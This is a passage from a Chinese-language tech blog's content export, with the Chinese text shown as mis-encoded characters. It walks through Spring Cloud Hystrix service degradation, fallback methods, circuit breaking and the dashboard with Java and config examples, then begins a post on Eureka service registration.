&lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 80 eureka: client: register-with-eureka: false service-url: # defaultZone: http://localhost:7001/eureka/ defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ serviceæ¥å£ï¼Œè°ƒç”¨cloud-provider-hystrix-payment8001é‡Œçš„æ–¹æ³• package com.kayleh.springcloud.service; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.stereotype.Component; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; /** * @Author: Wizard * @Date: 2020/8/7 20:54 */ @Component @FeignClient(&quot;CLOUD-PROVIDER-HYSTRIX-PAYMENT&quot;) public interface PaymentHystrixService { @GetMapping(value = &quot;/payment/hystrix/ok/{id}&quot;) public String paymentInfo_OK(@PathVariable(&quot;id&quot;) Integer id); @GetMapping(value = &quot;/payment/hystrix/timeout/{id}&quot;) public String paymentInfo_TimeOut(@PathVariable(&quot;id&quot;) Integer id); } controller package com.kayleh.springcloud.controller; @RestController @Slf4j public class OrderHystrixController { @Resource private PaymentHystrixService paymentFeignService; @GetMapping(value = &quot;/payment/hystrix/ok/{id}&quot;) public String paymentInfo_OK(@PathVariable(&quot;id&quot;) Integer id) { return paymentFeignService.paymentInfo_OK(id); } @GetMapping(value = &quot;/payment/hystrix/timeout/{id}&quot;) public String paymentInfo_TimeOut(@PathVariable(&quot;id&quot;) Integer id) { return paymentFeignService.paymentInfo_TimeOut(id); } } æµ‹è¯• http://localhost/consumer/payment/hystrix/ok/1 å¯¼è‡´åŸå›  1596871816037 è§£å†³è¶…æ—¶å¯¼è‡´æœåŠ¡å™¨å˜æ…¢ï¼ˆè½¬åœˆï¼‰ è¶…æ—¶ä¸åœ¨ç­‰å¾… å‡ºé”™ï¼ˆå®•æœºæˆ–ç¨‹åºè¿è¡Œå‡ºé”™ï¼‰ å‡ºé”™è¦æœ‰å…œåº• æ–¹æ³•ï¼š å¯¹æ–¹æœåŠ¡ï¼ˆ8001ï¼‰è¶…æ—¶äº†ï¼Œè°ƒç”¨è€…ï¼ˆ80ï¼‰ä¸èƒ½ä¸€ç›´å¡æ­»ç­‰å¾…ï¼Œå¿…é¡»æœ‰æœåŠ¡é™çº§ å¯¹æ–¹æœåŠ¡ï¼ˆ8001ï¼‰å®•æœºäº†ï¼Œè°ƒç”¨è€…ï¼ˆ80ï¼‰ä¸èƒ½ä¸€ç›´å¡æ­»ç­‰å¾…ï¼Œå¿…é¡»æœ‰æœåŠ¡é™çº§ å¯¹æ–¹æœåŠ¡ï¼ˆ8001ï¼‰OKï¼Œè°ƒç”¨è€…ï¼ˆ80ï¼‰è‡ªå·±å‡ºæ•…éšœæˆ–æœ‰è‡ªæˆ‘è¦æ±‚ï¼ˆè‡ªå·±çš„ç­‰å¾…æ—¶é—´å°äºæœåŠ¡æä¾›è€…ï¼‰ï¼Œè‡ªå·±å¤„ç†é™çº§ æœåŠ¡é™çº§ æœåŠ¡å™¨å¿™,è¯·ç¨åå†è¯•,ä¸è®©å®¢æˆ·ç«¯ç­‰å¾…å¹¶ç«‹åˆ»è¿”å›ä¸€ä¸ªå‹å¥½æç¤º,fallback å“ªäº›æƒ…å†µä¼šè§¦å‘é™çº§ ç¨‹åºè¿è¡Œå¼‚å¸¸ è¶…æ—¶ æœåŠ¡ç†”æ–­è§¦å‘æœåŠ¡é™çº§ çº¿ç¨‹æ± /ä¿¡å·é‡æ‰“æ»¡ä¹Ÿä¼šå¯¼è‡´æœåŠ¡é™çº§ é™çº§é…ç½® @HystrixCommand ä»Hystrix-8001æ‰¾é—®é¢˜ï¼Œè®¾ç½®è‡ªèº«è°ƒç”¨è¶…æ—¶æ—¶é—´çš„å³°å€¼ï¼Œå³°å€¼å†…å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œè¶…è¿‡äº†éœ€è¦æœ‰å…œåº•çš„æ–¹æ³•å¤„ç†ï¼Œä½œæœåŠ¡é™çº§fallback ä¿®æ”¹8001çš„Service package com.kayleh.springcloud.service; @Service public class PaymentService { /** * æ­£å¸¸è®¿é—® */ public String paymentInfo_OK(Integer id) { return &quot;çº¿ç¨‹æ± : &quot; + Thread.currentThread().getName() + &quot; paymentInfo_OK,id: &quot; + id + &quot;\\t&quot; + &quot;O(âˆ©_âˆ©)Oå“ˆå“ˆ~&quot;; } /** * è¶…æ—¶è®¿é—®ï¼Œæ¼”ç¤ºé™çº§ */ @HystrixCommand(fallbackMethod = &quot;paymentInfo_TimeOutHandler&quot;, commandProperties = { @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value = &quot;3000&quot;) }) public String paymentInfo_TimeOut(Integer id) { //æš‚åœ3ç§’é’Ÿ int timeNumber = 5; try { TimeUnit.SECONDS.sleep(timeNumber); } catch (InterruptedException e) { e.printStackTrace(); } return &quot;çº¿ç¨‹æ± : &quot; + Thread.currentThread().getName() + &quot; paymentInfo_TimeOut,id: &quot; + id + &quot;\\t&quot; + &quot;o(â•¥ï¹â•¥)oå“­&quot; + &quot;è€—æ—¶&quot; + timeNumber + &quot;ç§’é’Ÿ&quot;; } public String paymentInfo_TimeOutHandler(Integer id) { return &quot;è°ƒç”¨æ”¯ä»˜æ¥å£è¶…æ—¶æˆ–å¼‚å¸¸:\\t&quot; + &quot;\\tå½“å‰çº¿ç¨‹æ± åå­—&quot; + Thread.currentThread().getName(); } } ä¸€æ—¦è°ƒç”¨æœåŠ¡æ–¹æ³•å¤±è´¥åå¹¶æŠ›å‡ºé”™è¯¯ä¿¡æ¯åï¼Œä¼šè‡ªåŠ¨è°ƒç”¨@HystrixCommandæ ‡æ³¨å¥½çš„fallbackMethodè°ƒç”¨ç±»ä¸­æŒ‡å®šçš„æ–¹æ³•ã€‚ @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value = &quot;3000&quot; è¿™è¡Œä»£ç è¡¨ç¤º3ç§’ä»¥å†…éƒ½æ˜¯æ­£å¸¸çš„é€»è¾‘ã€‚ ä¿®æ”¹8001çš„ä¸»å¯åŠ¨ç±»,å¼€å¯é™çº§ @SpringBootApplication @EnableEurekaClient @EnableCircuitBreaker public class PaymentHystrixMain8001 { public static void main(String[] args) { SpringApplication.run(PaymentHystrixMain8001.class, args); } } æµ‹è¯•ï¼š http://localhost:8001/payment/hystrix/timeout/1 æ³¨é‡Šè¶…æ—¶å¼‚å¸¸,åˆ¶é€  10/0 çš„å¼‚å¸¸ä¹Ÿä¼šé™çº§. å½“å‰æœåŠ¡ä¸å¯ç”¨äº†,åšæœåŠ¡é™çº§,å…œåº•çš„æ–¹æ¡ˆéƒ½æ˜¯paymentInfo_TimeOutHandler. è®©æ”¯ä»˜æ¨¡å—ä¹Ÿæ”¯æŒHystrix ä¿®æ”¹cloud-consumer-feign-hystrix-order80çš„yaml: æ·»åŠ  feign: hystrix: enabled: true ä¿®æ”¹å¯åŠ¨ç±» @SpringBootApplication @EnableFeignClients @EnableHystrix public class OrderHystrixMain80 { public static void main(String[] args) { SpringApplication.run(OrderHystrixMain80.class, args); } } ä¿®æ”¹Controller(å®¢æˆ·ç«¯çš„ç­‰å¾…æ˜¯1.5ç§’) package com.kayleh.springcloud.controller; @RestController @Slf4j public class OrderHystrixController { @Resource private PaymentHystrixService paymentFeignService; @GetMapping(value = &quot;/consumer/payment/hystrix/ok/{id}&quot;) public String paymentInfo_OK(@PathVariable(&quot;id&quot;) Integer id) { return paymentFeignService.paymentInfo_OK(id); } @GetMapping(value = &quot;/consumer/payment/hystrix/timeout/{id}&quot;) @HystrixCommand(fallbackMethod = &quot;paymentInfo_TimeOutHandler&quot;, commandProperties = { @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value = &quot;1500&quot;) }) public String paymentInfo_TimeOut(@PathVariable(&quot;id&quot;) Integer id) { return paymentFeignService.paymentInfo_TimeOut(id); } public String paymentTimeOutFallbackMethod(Integer id) { return &quot;æˆ‘æ˜¯æ¶ˆè´¹è€…80ï¼Œå¯¹æ–¹æ”¯ä»˜ç³»ç»Ÿç¹å¿™è¯·10ç§’é’Ÿåå†è¯•è¯•æˆ–è€…è‡ªå·±è¿è¡Œå‡ºé”™è¯·æ£€æŸ¥è‡ªå·±ï¼Œo(â•¥ï¹â•¥)o&quot;; } } æµ‹è¯•: http://localhost/consumer/payment/hystrix/timeout/1 å¦‚æœä¿®æ”¹paymentInfo_TimeOutè¶…æ—¶é”™è¯¯ä¸º10/0,ä¹Ÿä¼šè¿›å…¥paymentTimeOutFallbackMethod å…¨å±€æœåŠ¡é™çº§ç›®å‰é—®é¢˜: æ¯ä¸ªä¸šåŠ¡æ–¹æ³•å¯¹åº”ä¸€ä¸ªå…œåº•çš„æ–¹æ³•,ä»£ç è†¨èƒ€ ç»Ÿä¸€å’Œè‡ªå®šä¹‰çš„åˆ†å¼€ è§£å†³é—®é¢˜:@DefaultProperties(defaultFallback = â€œâ€) 1596896213076 1596896313456 1596896340233 ä¿®æ”¹cloud-consumer-feign-hystrix-order80çš„OrderHystrixControllerï¼š æ·»åŠ ï¼š@DefaultProperties(defaultFallback = â€œpayment_Global_FallbackMethodâ€) â€‹ å’Œæ–¹æ³•payment_Global_FallbackMethod package com.kayleh.springcloud.controller; @RestController @Slf4j @DefaultProperties(defaultFallback = &quot;payment_Global_FallbackMethod&quot;) public class OrderHystrixController { @Resource private PaymentHystrixService paymentFeignService; @GetMapping(value = &quot;/consumer/payment/hystrix/ok/{id}&quot;) public String paymentInfo_OK(@PathVariable(&quot;id&quot;) Integer id) { return paymentFeignService.paymentInfo_OK(id); } @GetMapping(value = &quot;/consumer/payment/hystrix/timeout/{id}&quot;) // @HystrixCommand(fallbackMethod = &quot;paymentTimeOutFallbackMethod&quot;, commandProperties = { // @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value = &quot;1500&quot;) // }) @HystrixCommand public String paymentInfo_TimeOut(@PathVariable(&quot;id&quot;) Integer id) { return paymentFeignService.paymentInfo_TimeOut(id); } public String paymentTimeOutFallbackMethod(Integer id) { return &quot;æˆ‘æ˜¯æ¶ˆè´¹è€…80ï¼Œå¯¹æ–¹æ”¯ä»˜ç³»ç»Ÿç¹å¿™è¯·10ç§’é’Ÿåå†è¯•è¯•æˆ–è€…è‡ªå·±è¿è¡Œå‡ºé”™è¯·æ£€æŸ¥è‡ªå·±ï¼Œo(â•¥ï¹â•¥)o&quot;; } //å…¨å±€fallbackæ–¹æ³• public String payment_Global_FallbackMethod() { return &quot;Globalå¼‚å¸¸å¤„ç†ä¿¡æ¯,è¯·ç¨åå†è¯•,(âŠ™oâŠ™)â€¦&quot;; } } å†æµ‹è¯• http://localhost/consumer/payment/hystrix/timeout/1 --------------------- Globalå¼‚å¸¸å¤„ç†ä¿¡æ¯,è¯·ç¨åå†è¯•,(âŠ™oâŠ™)â€¦ é€šé…æœåŠ¡é™çº§FeignFallback1596898249818 ä¿®æ”¹cloud-consumer-feign-hystrix-order80ï¼Œæ ¹æ®cloud-consumer-feign-hystrix-order80å·²ç»æœ‰çš„PaymentHystrixServiceæ¥å£ï¼Œé‡æ–°æ–°å»ºä¸€ä¸ªç±»(PaymentFallbackService)å®ç°è¯¥æ¥å£ï¼Œç»Ÿä¸€ä¸ºæ¥å£é‡Œçš„æ–¹æ³•è¿›è¡Œå¼‚å¸¸å¤„ç†ã€‚ è®¿é—®å¼‚å¸¸å°±è®¿é—®å®ç°ç±»ä¸‹çš„æ–¹æ³•ã€‚ æ–°å»ºå®ç°ç±» package com.kayleh.springcloud.service; /** * @Author: Wizard * @Date: 2020/8/8 22:54 */ @Component public class PaymentFallbackService implements PaymentHystrixService { @Override public String paymentInfo_OK(Integer id) { return &quot;----------PaymentFallbackService fall back,o(â•¥ï¹â•¥)o\\tpaymentInfo_OK&quot;; } @Override public String paymentInfo_TimeOut(Integer id) { return &quot;----------PaymentFallbackService fall back,o(â•¥ï¹â•¥)o\\tpaymentInfo_TimeOut&quot;; } } yml:æ·»åŠ  feign: hystrix: enabled: true æ¥å£ä¿®æ”¹æ³¨è§£ï¼š @FeignClient(value = â€œCLOUD-PROVIDER-HYSTRIX-PAYMENTâ€, fallback = PaymentFallbackService.class) package com.kayleh.springcloud.service; /** * @Author: Wizard * @Date: 2020/8/7 20:54 */ @Component @FeignClient(value = &quot;CLOUD-PROVIDER-HYSTRIX-PAYMENT&quot;, fallback = PaymentFallbackService.class) public interface PaymentHystrixService { @GetMapping(value = &quot;/payment/hystrix/ok/{id}&quot;) public String paymentInfo_OK(@PathVariable(&quot;id&quot;) Integer id); @GetMapping(value = &quot;/payment/hystrix/timeout/{id}&quot;) public String paymentInfo_TimeOut(@PathVariable(&quot;id&quot;) Integer id); } æµ‹è¯•ï¼š http://localhost/consumer/payment/hystrix/ok/1 -æ­£å¸¸è®¿é—® å…³æ‰å¾®æœåŠ¡8001 å†è®¿é—®http://localhost/consumer/payment/hystrix/ok/1 -fallback æ­¤æ—¶æœåŠ¡ç«¯providerå·²ç»å®•æœºï¼Œä½†æ˜¯æˆ‘ä»¬åšäº†æœåŠ¡é™çº§å¤„ç†ï¼Œè®©å®¢æˆ·ç«¯åœ¨æœåŠ¡ç«¯ä¸å¯ç”¨æ—¶ä¹Ÿä¼šè·å¾—æç¤ºä¿¡æ¯è€Œä¸ä¼šæŒ‚èµ·è€—æ­»æœåŠ¡å™¨ã€‚ æœåŠ¡ç†”æ–­ ç±»æ¯”ä¿é™©ä¸è¾¾åˆ°æœ€å¤§æœåŠ¡å™¨è®¿é—®å,ç›´æ¥æ‹’ç»è®¿é—®,æ‹‰é—¸é™ç”µ,ç„¶åè°ƒç”¨æœåŠ¡é™çº§çš„æ–¹æ³•å¹¶è¿”å›å‹å¥½æç¤º,break ä¿é™©ä¸. æœåŠ¡é™çº§â€”&gt;è¿›è€Œç†”æ–­â€”&gt;æ¢å¤è°ƒç”¨é“¾è·¯ ç†”æ–­æœºåˆ¶æ¦‚è¿°ç†”æ–­æœºåˆ¶æ˜¯åº”å¯¹é›ªå´©æ•ˆåº”çš„ä¸€ç§å¾®æœåŠ¡é“¾è·¯ä¿æŠ¤æœºåˆ¶ã€‚å½“æ‰‡å‡ºé“¾è·¯çš„æŸä¸ªå¾®æœåŠ¡å‡ºé”™ä¸å¯ç”¨æˆ–è€…å“åº”æ—¶é—´å¤ªé•¿æ—¶ï¼Œä¼šè¿›è¡ŒæœåŠ¡çš„é™çº§ï¼Œè¿›è€Œç†”æ–­è¯¥èŠ‚ç‚¹å¾®æœåŠ¡çš„è°ƒç”¨ï¼Œå¿«é€Ÿè¿”å›é”™è¯¯çš„å“åº”ä¿¡æ¯ã€‚ å½“æ£€æµ‹åˆ°è¯¥èŠ‚ç‚¹å¾®æœåŠ¡è°ƒç”¨å“åº”æ­£å¸¸åï¼Œæ¢å¤è°ƒç”¨é“¾è·¯ã€‚ åœ¨SpringCloudæ¡†æ¶é‡Œï¼Œç†”æ–­æœºåˆ¶é€šè¿‡hystrixå®ç°ã€‚hystrixä¼šç›‘è§†å¾®æœåŠ¡é—´è°ƒç”¨çš„çŠ¶å†µï¼Œ å½“å¤±è´¥çš„è°ƒç”¨åˆ°ä¸€å®šé˜ˆå€¼ï¼Œç¼ºçœæ˜¯5ç§’å†…20æ¬¡è°ƒç”¨å¤±è´¥ï¼Œå°±ä¼šå¯åŠ¨ç†”æ–­æœºåˆ¶ã€‚ç†”æ–­æœºåˆ¶çš„æ³¨è§£æ˜¯@HystrixCommand. æ¡ˆä¾‹ï¼šä¿®æ”¹PaymentHystrixMain8001 ä¿®æ”¹PaymentService , æ·»åŠ  /** * æœåŠ¡ç†”æ–­ */ @HystrixCommand(fallbackMethod = &quot;paymentCircuitBreaker_fallback&quot;, commandProperties = { @HystrixProperty(name = &quot;circuitBreaker.enabled&quot;, value = &quot;true&quot;),//æ˜¯å¦å¼€å¯æ–­è·¯å™¨ @HystrixProperty(name = &quot;circuitBreaker.requestVolumeThreshold&quot;, value = &quot;10&quot;),//è¯·æ±‚æ¬¡æ•° @HystrixProperty(name = &quot;circuitBreaker.sleepWindowInMilliseconds&quot;, value=&quot;10000&quot;),//æ—¶é—´çª—å£æœŸ @HystrixProperty(name = &quot;circuitBreaker.errorThresholdPercentage&quot;, value = &quot;60&quot;),//å¤±è´¥ç‡è¾¾åˆ°å¤šå°‘åè·³é—¸ }) public String paymentCircuitBreaker(@PathVariable(&quot;id&quot;) Integer id) { if (id &lt; 0) { throw new RuntimeException(&quot;******id ä¸èƒ½ä¸ºè´Ÿæ•°&quot;); } String serialNumber = IdUtil.simpleUUID(); return Thread.currentThread().getName() + &quot;\\t&quot; + &quot;è°ƒç”¨æˆåŠŸ,æµæ°´å·:&quot; + serialNumber; } public String paymentCircuitBreaker_fallback(@PathVariable(&quot;id&quot;) Integer id) { return &quot;id ä¸èƒ½è´Ÿæ•°ï¼Œè¯·ç¨åå†è¯•ï¼Œo(â•¥ï¹â•¥)o id:&quot; + id; } PaymentController,æ·»åŠ  // -----æœåŠ¡ç†”æ–­ @GetMapping(&quot;/payment/circuit/{id}&quot;) public String paymentCircuitBreaker(@PathVariable(&quot;id&quot;) Integer id) { String result = paymentService.paymentCircuitBreaker(id); log.info(&quot;****result:&quot; + result); return result; } æµ‹è¯• http://localhost:8001/payment/circuit/1 http://localhost:8001/payment/circuit/-1 ç†”æ–­ç±»å‹ ç†”æ–­æ‰“å¼€ è¯·æ±‚ä¸å†è¿›è¡Œè°ƒç”¨å½“å‰æœåŠ¡,å†…éƒ¨è®¾ç½®æ—¶é’Ÿä¸€èˆ¬ä¸ºMTTR(å¹³å‡æ•…éšœå¤„ç†æ—¶é—´),å½“æ‰“å¼€æ—¶é•¿è¾¾åˆ°æ‰€è®¾æ—¶é’Ÿåˆ™è¿›å…¥åŠç†”æ–­çŠ¶æ€. ç†”æ–­å…³é—­ ç†”æ–­å…³é—­ä¸ä¼šå¯¹æœåŠ¡è¿›è¡Œç†”æ–­ ç†”æ–­åŠå¼€ éƒ¨åˆ†è¯·æ±‚æ ¹æ®è§„åˆ™è°ƒç”¨å½“å‰æœåŠ¡,å¦‚æœè¯·æ±‚æˆåŠŸä¸”ç¬¦åˆè§„åˆ™åˆ™è®¤ä¸ºå½“å‰æœåŠ¡æ¢å¤æ­£å¸¸,å…³é—­ç†”æ–­. æ–­è·¯å™¨åœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¼€å§‹èµ·ä½œç”¨: 1596959205085 æ–­è·¯å™¨æ‰“å¼€æˆ–å…³é—­çš„æ¡ä»¶: 1596959390685 æ–­è·¯å™¨æ‰“å¼€ä¹‹å: 1596959437485 Hystrixå›¾å½¢åŒ–DashBoard1596960213699 æ–°å»ºcloud-consumer-hystrix-dashboard9001 pom.xml &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 9001 ä¸»å¯åŠ¨ç±» /** * @Author: Wizard * @Date: 2020/8/3 18:10 */ @SpringBootApplication @EnableHystrixDashboard public class HystrixDashboard9001 { public static void main(String[] args) { SpringApplication.run(HystrixDashboard9001.class, args); } } ä¿®æ”¹cloud-provider-hystrix-payment8001çš„ä¸»å¯åŠ¨ç±»ï¼šæ·»åŠ  /** * @Author: Wizard * @Date: 2020/8/3 18:10 */ @SpringBootApplication @EnableEurekaClient @EnableCircuitBreaker public class PaymentHystrixMain8001 { public static void main(String[] args) { SpringApplication.run(PaymentHystrixMain8001.class, args); } /** * æ­¤é…ç½®æ˜¯ä¸ºäº†æœåŠ¡ç›‘æ§è€Œé…ç½®ï¼Œä¸æœåŠ¡å®¹é”™æœ¬èº«æ— å…³ï¼ŒSpringCloudå‡çº§åçš„å‘ * ServletRegistrationBeanå› ä¸ºspringbootçš„é»˜è®¤è·¯å¾„ä¸æ˜¯&quot;/hystrix.stream&quot; * åªè¦åœ¨è‡ªå·±çš„é¡¹ç›®é…ç½®ä¸Šä¸‹é¢çš„servletå°±å¯ä»¥äº† */ @Bean public ServletRegistrationBean getServlet() { HystrixMetricsStreamServlet streamServlet = new HystrixMetricsStreamServlet(); ServletRegistrationBean registrationBean = new ServletRegistrationBean(streamServlet); registrationBean.setLoadOnStartup(1); registrationBean.addUrlMappings(&quot;/hystrix.stream&quot;); registrationBean.setName(&quot;HystrixMetricsStreamServlet&quot;); return registrationBean; } } æµ‹è¯• http://localhost:9001/hystrix é…ç½®9001ç›‘æ§8001 1596981678720 æµ‹è¯• http://localhost:8001/payment/circuit/1 http://localhost:8001/payment/circuit/-1 ä¸ƒè‰²: 1596981829382 ä¸€åœˆ: 1596981876130 1596981916733 ä¸€çº¿: 1596981953995 æ•´ä¸ªå›¾: 1596981916733 1596981916733 æµç¨‹å›¾ï¼š 1596981916733","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"EurekaæœåŠ¡æ³¨å†Œä¸å‘ç°","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„2","date":"2020-08-14T07:03:57.000Z","updated":"2021-04-11T17:11:28.661Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„2/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%842/","excerpt":"EurekaæœåŠ¡æ³¨å†Œä¸å‘ç°","text":"EurekaæœåŠ¡æ³¨å†Œä¸å‘ç° æœåŠ¡æ²»ç†Spring Cloudå°è£…äº†Netflixå…¬å¸å¼€å‘çš„Eurekaæ¨¡å—æ¥å®ç°æœåŠ¡æ²»ç†ã€‚ åœ¨ä¼ ç»Ÿçš„rpcè¿œç¨‹è°ƒç”¨æ¡†æ¶ä¸­ï¼Œç®¡ç†æ¯ä¸ªæœåŠ¡ä¸æœåŠ¡ä¹‹é—´ä¾èµ–å…³ç³»æ¯”è¾ƒå¤æ‚ï¼Œç®¡ç†æ¯”è¾ƒå¤æ‚ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨æœåŠ¡æ²»ç†ï¼Œç®¡ç†æœåŠ¡äºæœåŠ¡ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå¯ä»¥å®ç°æœåŠ¡è°ƒç”¨ã€è´Ÿè½½å‡è¡¡ã€å®¹é”™ç­‰ï¼Œå®ç°æœåŠ¡å‘ç°ä¸æ³¨å†Œã€‚ æœåŠ¡æ³¨å†Œä¸å‘ç°Eurekaé‡‡ç”¨äº†CSçš„è®¾è®¡æ¶æ„ï¼ŒEureka Serverä½œä¸ºæœåŠ¡æ³¨å†ŒåŠŸèƒ½çš„æœåŠ¡å™¨ï¼Œå®ƒæ˜¯æœåŠ¡æ³¨å†Œçš„ä¸­å¿ƒã€‚è€Œç³»ç»Ÿä¸­å…¶ä»–çš„å¾®æœåŠ¡ï¼Œä½¿ç”¨äº†Eurekaçš„å®¢æˆ·ç«¯è¿æ¥åˆ°Eureka Serverå¹¶ç»´æŒå¿ƒè·³è¿æ¥ã€‚è¿™æ ·ç³»ç»Ÿçš„ç»´æŠ¤äººå‘˜å°±å¯ä»¥é€šè¿‡Eureka Serveræ¥ç›‘æ§ç³»ç»Ÿä¸­å„ä¸ªå¾®æœåŠ¡æ˜¯å¦æ­£å¸¸è¿è¡Œã€‚ åœ¨æœåŠ¡æ³¨å†Œä¸å‘ç°ä¸­ï¼Œæœ‰ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒã€‚å½“æœåŠ¡å™¨å¯åŠ¨çš„æ—¶å€™ï¼Œä¼šæŠŠå½“å‰è‡ªå·±æœåŠ¡å™¨çš„ä¿¡æ¯ æ¯”å¦‚ æœåŠ¡åœ°å€é€šè®¯åœ°å€ç­‰ä»¥åˆ«åæ–¹å¼æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒä¸Šã€‚å¦ä¸€æ–¹(æ¶ˆè´¹è€…|æœåŠ¡æä¾›è€…)ï¼Œä»¥è¯¥åˆ«åçš„æ–¹å¼å»æ³¨å†Œä¸­å¿ƒä¸Šè·å–åˆ°å®é™…çš„æœåŠ¡é€šè®¯åœ°å€ï¼Œç„¶åå†å®ç°æœ¬åœ°RPCè°ƒç”¨RPCè¿œç¨‹è°ƒç”¨æ¡†æ¶æ ¸å¿ƒè®¾è®¡æ€æƒ³ï¼šåœ¨äºæ³¨å†Œä¸­å¿ƒä¸Šï¼Œå› ä¸ºä½¿ç”¨æ³¨å†Œä¸­å¿ƒç®¡ç†æ¯ä¸ªæœåŠ¡ä¸æœåŠ¡ä¹‹é—´çš„ä¸€ä¸ªä¾èµ–å…³ç³»(æœåŠ¡æ²»ç†æ¦‚å¿µ).åœ¨ä»»ä½•rpcè¿œç¨‹æ¡†æ¶ä¸­,éƒ½ä¼šæœ‰ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒ(å­˜æ”¾æœåŠ¡åœ°å€ç›¸å…³ä¿¡æ¯(æ¥å£åœ°å€)); â€‹ å·¦è¾¹æ˜¯Eurekaç³»ç»Ÿæ¶æ„,å³è¾¹æ˜¯Dubboçš„æ¶æ„ 1596525780055 EurekaåŒ…å«ä¸¤ä¸ªç»„ä»¶:Eureka Serverå’ŒEureka Client Eureka Serveræä¾›æœåŠ¡æ³¨å†ŒæœåŠ¡ å„ä¸ªå¾®æœåŠ¡èŠ‚ç‚¹é€šè¿‡é…ç½®å¯åŠ¨,ä¼šåœ¨EurekaServerä¸­è¿›è¡Œæ³¨å†Œ,è¿™æ ·EurekaServerä¸­çš„æœåŠ¡æ³¨å†Œè¡¨ä¸­å°†ä¼šå­˜å‚¨æ‰€æœ‰å¯ç”¨æœåŠ¡èŠ‚ç‚¹çš„ä¿¡æ¯,æœåŠ¡èŠ‚ç‚¹çš„ä¿¡æ¯å¯ä»¥åœ¨ç•Œé¢ä¸­ç›´è§‚çœ‹åˆ°. EurekaClienté€šè¿‡æ³¨å†Œä¸­å¿ƒè¿›è¡Œè®¿é—® æ˜¯ä¸€ä¸ªJavaå®¢æˆ·ç«¯,ç”¨äºç®€åŒ–Eureka 